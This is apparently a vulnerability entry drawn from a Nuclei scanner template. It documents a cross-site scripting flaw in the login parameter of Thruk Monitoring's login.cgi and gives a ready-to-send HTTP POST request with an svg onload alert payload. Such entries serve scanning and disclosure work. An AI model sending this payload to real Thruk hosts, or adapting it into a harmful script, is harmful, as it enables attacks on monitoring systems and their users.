# Nuclei Template: Thruk Monitoring Webinterface - Cross-Site Scripting
**Template ID:** thruk-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**CWE:** CWE-79
**Source:** Nuclei Template (`thruk-xss.yaml`)

## Vulnerability Information & PoC

## Description
Thruk Monitoring Webinterface contains a cross-site scripting vulnerability via the login parameter at /thruk/cgi-bin/login.cgi.

## Steps to reproduce / Exploit Payload
```http
POST /thruk/cgi-bin/login.cgi HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

referer=&login=%22%3Csvg%2Fonload%3Dalert%28document.domain%29%3E%22%40gmail.com&password=test&submit=Login
```

## References
- https://www.thruk.org/download.html
- https://www.usd.de/en/security-advisory-thruk-monitoring-v2-46-3
